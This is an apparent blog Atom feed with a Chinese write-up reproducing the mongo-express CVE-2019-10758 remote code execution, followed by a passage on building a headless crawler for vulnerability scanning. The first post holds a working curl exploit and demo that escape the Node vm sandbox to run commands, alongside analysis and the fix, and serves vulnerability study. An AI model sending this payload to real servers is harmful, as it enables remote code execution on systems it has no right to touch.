<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Passer6y&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://0day.design/"/>
  <updated>2020-01-08T12:53:57.762Z</updated>
  <id>http://0day.design/</id>
  
  <author>
    <name>Passer6y</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2019-10758 mongo-express RCE复现分析</title>
    <link href="http://0day.design/2020/01/08/CVE-2019-10758%E5%A4%8D%E7%8E%B0/"/>
    <id>http://0day.design/2020/01/08/CVE-2019-10758复现/</id>
    <published>2020-01-08T09:26:00.000Z</published>
    <updated>2020-01-08T12:53:57.762Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>拉一个MongoDB的docker镜像：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 27017:27017 -d mongo</span><br></pre></td></tr></table></figure></p><p>本地<code>npm init</code>创建个<code>package.json</code>，接着添加依赖库<a href="mailto:`mongo-express@0.53.0" target="_blank" rel="noopener">`mongo-express@0.53.0</a><code>,</code>npm install`安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;dependencies&quot;: &#123;</span><br><span class="line">  &quot;mongo-express&quot;: &quot;0.53.0&quot;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></p><p>EXP:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &apos;http://localhost:8081/checkValid&apos; -H &apos;Authorization: Basic YWRtaW46cGFzcw==&apos;  --data &apos;document=this.constructor.constructor(&quot;return process&quot;)().mainModule.require(&quot;child_process&quot;).execSync(&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)&apos;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/01/08/IdKYBmSTFE2wXjo.jpg" alt="-w1093"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>先来看看<code>checkValid</code>这个路由：lib/router.js#279行<br><img src="https://i.loli.net/2020/01/08/GPdTktMignySW7b.jpg" alt="-w1092"></p><p>跟进<code>checkValid</code>函数：lib/routes/document.js#28<br><img src="https://i.loli.net/2020/01/08/pNMWhLa23QjFBiR.jpg" alt="-w1074"></p><p>获取post的的<code>doc</code>参数，使用bson库进行BSON数据转换。</p><blockquote><p>BSON是一种计算机数据交换格式，主要被用作MongoDB数据库中的数据存储和网络传输格式。它是一种二进制表示形式，能用来表示简单数据结构、关联数组（MongoDB中称为“对象”或“文档”）以及MongoDB中的各种数据类型。BSON之名缘于JSON，含义为Binary JSON（二进制JSON）</p></blockquote><p>跟进toBSON函数：lib/bson.js#54<br><img src="https://i.loli.net/2020/01/08/JdDlmgjT7A8cq3M.jpg" alt="-w1471"><br>在第60行进入vm沙箱eval操作。</p><p>使用<code>this.constructor.constructor</code>逃逸沙箱，参考<a href="https://xz.aliyun.com/t/7056" target="_blank" rel="noopener">https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html</a>，使用<code>this</code>指向VM容器外，使用<code>.constructor</code>指向构造器，访问构造器的构造器对象，创建一个构造函数。</p><p>demo:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">"vm"</span>);</span><br><span class="line"><span class="keyword">const</span> xyz = vm.runInNewContext(<span class="string">`const process = this.constructor.constructor('return this.process')();</span></span><br><span class="line"><span class="string">process.mainModule.require('child_process').execSync('/Applications/Calculator.app/Contents/MacOS/Calculator').toString()`</span>);</span><br><span class="line"><span class="built_in">console</span>.log(xyz);</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/01/08/4XVZOl1FQnp9SvB.jpg" alt="-w1148"></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>官方修复删除了vm库的引用：<a href="https://github.com/mongo-express/mongo-express/commit/d8c9bda46a204ecba1d35558452685cd0674e6f2" target="_blank" rel="noopener">https://github.com/mongo-express/mongo-express/commit/d8c9bda46a204ecba1d35558452685cd0674e6f2</a><br><img src="https://i.loli.net/2020/01/08/HlCbfEqkNW2VOvR.jpg" alt="-w1030"></p><p>参考：</p><ul><li><a href="https://xz.aliyun.com/t/7056" target="_blank" rel="noopener">CVE-2019-10758:mongo-expressRCE复现分析</a></li><li><a href="https://github.com/masahiro331/CVE-2019-10758" target="_blank" rel="noopener">CVE-2019-10758 POC</a></li><li><a href="https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html" target="_blank" rel="noopener">Sandboxing NodeJS is hard, here is why</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function</a></li><li><a href="http://dfkaye.github.io/2014/03/14/javascript-eval-and-function-constructor/" target="_blank" rel="noopener">http://dfkaye.github.io/2014/03/14/javascript-eval-and-function-constructor/</a></li><li><a href="https://github.com/i0natan/nodebestpractices/issues/211" target="_blank" rel="noopener">https://github.com/i0natan/nodebestpractices/issues/211</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
    
      <category term="Web" scheme="http://0day.design/tags/Web/"/>
    
      <category term="漏洞分析" scheme="http://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>NodeJS Headless 动态漏扫爬虫学习记录(爬虫篇)</title>
    <link href="http://0day.design/2020/01/08/NodeJS%20Headless%20%E5%8A%A8%E6%80%81%E6%BC%8F%E6%89%AB%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95(%E7%88%AC%E8%99%AB%E7%AF%87)/"/>
    <id>http://0day.design/2020/01/08/NodeJS Headless 动态漏扫爬虫学习记录(爬虫篇)/</id>
    <published>2020-01-08T05:20:00.000Z</published>
    <updated>2020-01-08T05:20:30.665Z</updated>
    
    <content type="html"><![CDATA[<p>文章首发先知社区：<a href="https://xz.aliyun.com/t/7064" target="_blank" rel="noopener">https://xz.aliyun.com/t/7064</a>  </p><p>在两年前谷歌推出了一个Headless Chrome NodeJS API:<a href="https://github.com/puppeteer/puppeteer" target="_blank" rel="noopener">Puppeteer</a>，后来Github一个大牛用Python封装了一套api，作为一个第三方api:<a href="https://github.com/miyakogi/pyppeteer" target="_blank" rel="noopener">Pyppeteer</a>。</p><p>在去年的时候，尝试过用Pyppeteer写过动态爬虫，Python版由于是第三方一个作者封装的，更新很慢，落后官方版本很多，很多迷之BUG，比如CDP协议去操作远程chromium，很容易中断导致一堆僵尸进程的chromium关不掉。虽然最后还是顶着各种bug，写成一个勉强能用的工具，但在服务器上很吃内存，一方面也是因为写的任务调度机制也有一些问题，最后服役了许多天天，不想维护了，捡了几个漏洞就退休了。后来在平时的工作和学习中频频接触到nodeJS，于是就趁着这段时间用nodejs重新实现一遍。<br><a id="more"></a></p><h2 id="JS基础"><a href="#JS基础" class="headerlink" title="JS基础"></a>JS基础</h2><h3 id="JS中的事件模型"><a href="#JS中的事件模型" class="headerlink" title="JS中的事件模型"></a>JS中的事件模型</h3><p>分为：内联、DOM0级、DOM2级事件<br><img src="https://i.loli.net/2020/01/05/KHqkNfO5GUPtCYd.jpg" alt="-w1016"></p><h3 id="JS原型链介绍"><a href="#JS原型链介绍" class="headerlink" title="JS原型链介绍"></a>JS原型链介绍</h3><p>Js是一种基于原型的语言，每一个对象都有一个原型对象，对象以其原型为模板、从原型继承方法和属性。原型对象也可能拥有原型，一层一层、以此类推。<br>在传统的面向对象编程中，我们首先会定义“类”，此后创建对象实例时，类中定义的所有属性和方法都被复制到实例中。但在 js 中并不是像这样复制，而是在对象实例和类之间之间建立一个链接。<br>demo:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Cat</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.color = <span class="string">'test'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> cat = <span class="keyword">new</span> Cat()</span><br><span class="line"><span class="built_in">console</span>.log(cat.__proto__ === Cat.prototype)   <span class="comment">// true</span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/01/05/hANutc8Tlp4oaMK.jpg" alt="-w909"><br>在 JavaScript 中，如果想访问某个属性，首先会在实例对象（cat）的内部寻找，如果没找到，就会在该对象的原型（<code>cat._proto_</code>，即 <code>Cat.prototype</code>）上找，我们知道，对象的原型也是对象，它也有原型，如果在对象的原型上也没有找到目标属性，则会在对象的原型的原型（<code>Cat.prototype._proto_</code>）上寻找，以此内推，直到找到这个属性或者到达了最顶层。在原型上一层一层寻找，这便是原型链了。</p><h2 id="如何抓取更多的URL"><a href="#如何抓取更多的URL" class="headerlink" title="如何抓取更多的URL"></a>如何抓取更多的URL</h2><p>几种思路，可以直接使用正则抓取，也可以解析各种含有链接的标签，也就是src,href属性等。<br>当然这些都有一定的缺陷，比如相对路径需要单独去处理成完整URl，有的使用的js跳转，而不把URl写到标签内等等。另一种思路即使用动态爬虫的思路，Hook JS，通过触发各种事件信息收集URL。这里计划第一版爬虫先实现简易的URL抓取，之后再进一步优化。首先最常想到的是使用正则抓取，其次可以利用Headless的优势，将动态JS渲染的链接标签、属性抓取。</p><h3 id="收集src、href属性的标签"><a href="#收集src、href属性的标签" class="headerlink" title="收集src、href属性的标签"></a>收集src、href属性的标签</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function getSrcAndHrefLinks(nodes) &#123;</span><br><span class="line">    let result = [];</span><br><span class="line">    for(let node of nodes)&#123;</span><br><span class="line">        let src = node.getAttribute(&quot;src&quot;);</span><br><span class="line">        let href = node.getAttribute(&quot;href&quot;);</span><br><span class="line">        let action = node.getAttribute(&quot;action&quot;);</span><br><span class="line">        if (src)&#123;</span><br><span class="line">            result.push(src)</span><br><span class="line">        &#125;</span><br><span class="line">        if (href)&#123;</span><br><span class="line">            result.push(href);</span><br><span class="line">        &#125;</span><br><span class="line">        if(action)&#123;</span><br><span class="line">            result.push(action);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br><span class="line">const links = await page.$$eval(&apos;[src],[href],[action]&apos;, getSrcAndHrefLinks);</span><br></pre></td></tr></table></figure><p>爬行结果：<br><img src="https://i.loli.net/2020/01/05/LskpidD2mlUJOIo.jpg" alt="-w1366"></p><p>接着通过简单的URL去重、清洗，爬虫便可以进行迭代爬行了。</p><p>经过一番测试后发现，对于下面这种页面URL抓取是会有遗漏的：<br><img src="https://i.loli.net/2020/01/05/eA9Uh6RJVyxTq7Q.jpg" alt="-w1547"></p><p>有的将跳转操作全写入了js事件中，或者有的要进行页面滚动JS才会进一步渲染，无疑遗漏了很多URL。解决这些问题的关键在于模拟用户操作，而用户操作的本质则为触发各种DOM事件。所以接下来需要解决的问题在于收集各种DOM事件，以及去触发它们。</p><h3 id="收集DOM事件"><a href="#收集DOM事件" class="headerlink" title="收集DOM事件"></a>收集DOM事件</h3><p>在学习收集DOM事件的过程中参考了<a href="https://www.anquanke.com/post/id/178339" target="_blank" rel="noopener">9ian1i师傅</a>以及<a href="http://blog.fatezero.org/2018/03/05/web-scanner-crawler-01/" target="_blank" rel="noopener">fate0师傅</a>文章，很感谢前辈们的拓荒。</p><h4 id="Hook事件"><a href="#Hook事件" class="headerlink" title="Hook事件"></a>Hook事件</h4><p>注册事件分为DOM0和DOM2事件，使用方法不同，收集方法也有差异。这里简单介绍了两者的差异<a href="https://www.jianshu.com/p/b850978c2ee8" target="_blank" rel="noopener">DOM0级事件和DOM2级事件区别</a>。以及<a href="https://developer.mozilla.org/zh-CN/docs/Learn/JavaScript/Objects/Object_prototypes" target="_blank" rel="noopener">JavaScript Prototype Chain 原型链学习</a><br><strong>DOM0</strong><br>对于DOM0的事件监听，可以修改所有节点的相关属性原型，设置其访问器属性。<br>demo:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dom0Hook</span>(<span class="params">that, event_name</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"tagname: "</span> + that.tagName + <span class="string">", event_name:"</span> + event_name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Object</span>.defineProperties(HTMLElement.prototype, &#123;</span><br><span class="line">    onclick: &#123;<span class="attr">set</span>: <span class="function"><span class="keyword">function</span>(<span class="params">newValue</span>)</span>&#123;onclick = newValue;dom0Hook(<span class="keyword">this</span>, <span class="string">"click"</span>);&#125;&#125;,</span><br><span class="line">    onchange: &#123;<span class="attr">set</span>: <span class="function"><span class="keyword">function</span>(<span class="params">newValue</span>)</span>&#123;onchange = newValue;dom0Hook(<span class="keyword">this</span>, <span class="string">"change"</span>);&#125;&#125;</span><br><span class="line">&#125;);</span><br><span class="line">    $<span class="number">0</span> = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"a"</span>);</span><br><span class="line">    $<span class="number">0</span>[<span class="number">0</span>].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">console</span>.log(<span class="string">"a"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/01/05/RaAdNwiHEPF2fom.jpg" alt="-w646"></p><p><strong>DOM2</strong><br>DOM2级事件Hook，可以通过修改addEventListener的原型即可：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> oldEvent = Element.prototype.addEventListener;</span><br><span class="line">Element.prototype.addEventListener = <span class="function"><span class="keyword">function</span>(<span class="params">event_name, event_func, useCapture</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"tagname: "</span> + <span class="keyword">this</span>.tagName + <span class="string">", event_name:"</span> + event_name);</span><br><span class="line">    oldEvent.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/01/05/dmCfy7lkevOHa6s.jpg" alt="-w722"></p><p><strong>内联事件</strong><br>除了上述两种绑定事件的办法，还有通过写在标签内的内联事件，无法通过Hook来收集。比如：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"test"</span> <span class="attr">onclick</span>=<span class="string">"alert('1')"</span>&gt;</span>123<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>解决办法是通过遍历节点，执行on事件：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger_inline</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> nodes = <span class="built_in">document</span>.all;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; nodes.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> attrs = nodes[i].attributes;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; attrs.length; j++) &#123;</span><br><span class="line">            attr_name = attrs[j].nodeName;</span><br><span class="line">            attr_value = attrs[j].nodeValue;</span><br><span class="line">            <span class="keyword">if</span> (attr_name.substr(<span class="number">0</span>, <span class="number">2</span>) == <span class="string">"on"</span>) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(attrs[j].nodeName + <span class="string">' : '</span> + attr_value);</span><br><span class="line">                <span class="built_in">eval</span>(attr_value);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (attr_name <span class="keyword">in</span> &#123;<span class="string">"src"</span>: <span class="number">1</span>, <span class="string">"href"</span>: <span class="number">1</span>&#125; &amp;&amp; attrs[j].nodeValue.substr(<span class="number">0</span>, <span class="number">11</span>) == <span class="string">"javascript:"</span>) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(attrs[j].nodeName + <span class="string">' : '</span> + attr_value);</span><br><span class="line">                <span class="built_in">eval</span>(attr_value.substr(<span class="number">11</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/01/05/E8BT97cebUklidu.jpg" alt="-w1064"></p><blockquote><p>或者TreeWalker获取全部节点，用<code>dispatchEvent</code>挨个触发事件<br>而DOM0、DOM2级事件通过收集到的标签和事件名依次触发即可。</p></blockquote><h3 id="导航锁定"><a href="#导航锁定" class="headerlink" title="导航锁定"></a>导航锁定</h3><p>触发事件的过程中，可能会被意外的导航请求给中断操作，所以我们应当取消非本页面的导航请求，避免造成漏抓。<br><strong>前端JS跳转</strong><br>取消跳转操作，记录跳转URL，但是Chrome不允许我们通过<code>Object.defineProperty</code>重定义<code>window.Location</code>操作，即无法通过Hook获取跳转的URL。<br><img src="https://i.loli.net/2020/01/05/meiza4wDHx9jo1G.jpg" alt="-w705"></p><p>搜索了一些资料之后大致有下边一些解决办法：</p><ul><li><a href="http://blog.fatezero.org/2018/03/05/web-scanner-crawler-01/" target="_blank" rel="noopener">修改Chromium默认location属性的configurable为true</a></li><li>加载自定义插件</li><li>使用puppeteer的拦截器返回204状态码</li></ul><p>但最后我选择了<a href="https://github.com/myvyang/chromium_for_spider" target="_blank" rel="noopener">为漏扫动态爬虫定制的浏览器</a>，后边会细说。</p><p><strong>后端跳转</strong><br>请求体无内容，则跟进；请求体有内容，则渲染页面，记录跳转url。</p><h3 id="表单填充"><a href="#表单填充" class="headerlink" title="表单填充"></a>表单填充</h3><p><strong>锁定重置表单事件</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTMLFormElement.prototype.reset = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"cancel reset form"</span>)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(HTMLFormElement.prototype, <span class="string">"reset"</span>, &#123;<span class="string">"writable"</span>: <span class="literal">false</span>, <span class="string">"configurable"</span>: <span class="literal">false</span>&#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p><blockquote><p>挖坑</p></blockquote><h3 id="为漏扫动态爬虫定制的浏览器"><a href="#为漏扫动态爬虫定制的浏览器" class="headerlink" title="为漏扫动态爬虫定制的浏览器"></a>为漏扫动态爬虫定制的浏览器</h3><p>解决这个前端导航hook问题的时候，发现github上有一个大牛通过修改源码实现了一个<a href="https://github.com/myvyang/chromium_for_spider" target="_blank" rel="noopener">为漏扫定制版的Chrome</a>。作者通过修改chromium源码实现了导航的Hook，禁止页面的天锻跳转并收集其跳转的URL，并且通过底层hook了所有非默认事件，为我们开发提供了很多便利。</p><p>但还是有一些小的地方需要我们自己优化一下，会锁定导航自动收集前端跳转URL，但不会处理后端的Location，这里我们用一个拦截器去实现，记录后端跳转，加入扫描队列：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> page.on(<span class="string">'response'</span>, interceptedResponse =&gt;&#123;</span><br><span class="line">    <span class="keyword">let</span> status = interceptedResponse.status();</span><br><span class="line">    <span class="keyword">if</span>(status.toString().substr(<span class="number">0</span>,<span class="number">2</span>) === <span class="string">"30"</span>)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"url: "</span> + interceptedResponse.url());</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"status: "</span> + status);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"headers: "</span> + interceptedResponse.headers().location);</span><br><span class="line">        <span class="comment">// 添加进任务队列</span></span><br><span class="line">        cluster.queue(interceptedResponse.headers().location);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong>事件触发&amp;收集结果</strong><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">executeEvent</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> firedEventNames = [<span class="string">"focus"</span>, <span class="string">"mouseover"</span>, <span class="string">"mousedown"</span>, <span class="string">"click"</span>, <span class="string">"error"</span>];</span><br><span class="line">    <span class="keyword">var</span> firedEvents = &#123;&#125;;</span><br><span class="line">    <span class="keyword">var</span> length = firedEventNames.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">        firedEvents[firedEventNames[i]] = <span class="built_in">document</span>.createEvent(<span class="string">"HTMLEvents"</span>);</span><br><span class="line">        firedEvents[firedEventNames[i]].initEvent(firedEventNames[i], <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> eventLength = <span class="built_in">window</span>.eventNames.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; eventLength; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> eventName =  <span class="built_in">window</span>.eventNames[i].split(<span class="string">"_-_"</span>)[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">var</span> eventNode =  <span class="built_in">window</span>.eventNodes[i];</span><br><span class="line">        <span class="keyword">var</span> index = firedEventNames.indexOf(eventName);</span><br><span class="line">        <span class="keyword">if</span> (index &gt; <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (eventNode != <span class="literal">undefined</span>) &#123;</span><br><span class="line">                eventNode.dispatchEvent(firedEvents[eventName]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> result = <span class="built_in">window</span>.info.split(<span class="string">"_-_"</span>);</span><br><span class="line">    result.splice(<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/01/05/1GeoYZhqvTsix7Q.jpg" alt="-w1679"></p><h3 id="添加cookie"><a href="#添加cookie" class="headerlink" title="添加cookie"></a>添加cookie</h3><p>对于使用SSO单点站点体系而言，可以在开始爬行之前指定一段cookie，比如从文本中读取。但是对于爬行目标较为多且SSO的覆盖面有限的情况下，就得使用数据库了。在测试过程中遇到了另一个问题，就是并发过高，或者发送有害的payload，会有Cookie失效的问题，这里想到了一种比较实用的解决办法，写一个浏览器插件及时将当前页面的cookie同步到服务端数据库，然后爬虫定期从数据库中更新最新的cookie。</p><p><strong>Chrome插件同步cookie</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateCookie</span>(<span class="params">domain, name , value</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> api = <span class="string">"http://127.0.0.1/add-cookie"</span>;</span><br><span class="line">    $.post(api, &#123;</span><br><span class="line">        <span class="string">"domain"</span>: domain,</span><br><span class="line">        <span class="string">"name"</span>: name,</span><br><span class="line">        <span class="string">"value"</span>: value,</span><br><span class="line">    &#125;, <span class="function"><span class="keyword">function</span> (<span class="params">data, status</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(status);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * doc: https://developer.chrome.com/extensions/cookies</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">chrome.cookies.onChanged.addListener(<span class="function">(<span class="params">changeInfo</span>) =&gt;</span>&#123;</span><br><span class="line">    <span class="comment">// 记录Cookie增加，Cookie更新分两步，第一步先删除，第二步再增加</span></span><br><span class="line">    <span class="keyword">if</span>(changeInfo.removed === <span class="literal">false</span>)&#123;</span><br><span class="line">        updateCookie(changeInfo.cookie.name, changeInfo.cookie.value, changeInfo.cookie.domain);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h3 id="相似URL去重"><a href="#相似URL去重" class="headerlink" title="相似URL去重"></a>相似URL去重</h3><p>去重在爬虫中是一个较为核心功能，规则过于宽松可能导致爬行不完或者说做一些无意义的重复爬行，规则过于严格则可能导致抓取结果过少，影响后续抓取和漏洞检测。去重一般分为两步对爬行队列去重，或者对结果集去重。</p><p>在解决这个问题的时候，参考了Fr1day师傅<a href="https://www.anquanke.com/post/id/85298" target="_blank" rel="noopener">【技术分享】浅谈动态爬虫与去重</a>的URL去重思路。不失为一种比较便捷，能基本满足当前需求的一种解决办法。</p><p><strong>参数分析</strong><br>大致有以下几种参数：类型int、hash、中文、URL编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?m=home&amp;c=index&amp;a=index</span><br><span class="line">?type=202cb962ac59075b964b07152d234b70</span><br><span class="line">?id=1</span><br><span class="line">?msg=%E6%B6%88%E6%81%AF</span><br></pre></td></tr></table></figure></p><p>根据不同的类型对其进行处理：</p><ol><li>纯字母：中参数的值表示不同的路由功能，需要对这种参数进行保留</li><li>字母数字混合：可能是用户的hash，也可能具有路由功能，可根据任务量情况选择性保留</li><li>纯数字、URl编码：进行去重</li></ol><p>处理结果即：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?m=home&amp;c=index&amp;a=index</span><br><span class="line">?type=&#123;hash&#125;</span><br><span class="line">?id=&#123;int&#125;</span><br><span class="line">?msg=&#123;urlencode&#125;</span><br></pre></td></tr></table></figure></p><p>然后在数据库中将相同的清洗掉即可。</p><h3 id="相似页面去重"><a href="#相似页面去重" class="headerlink" title="相似页面去重"></a>相似页面去重</h3><p>相似度计算，监控资产变化<br>网页结构相似度:<a 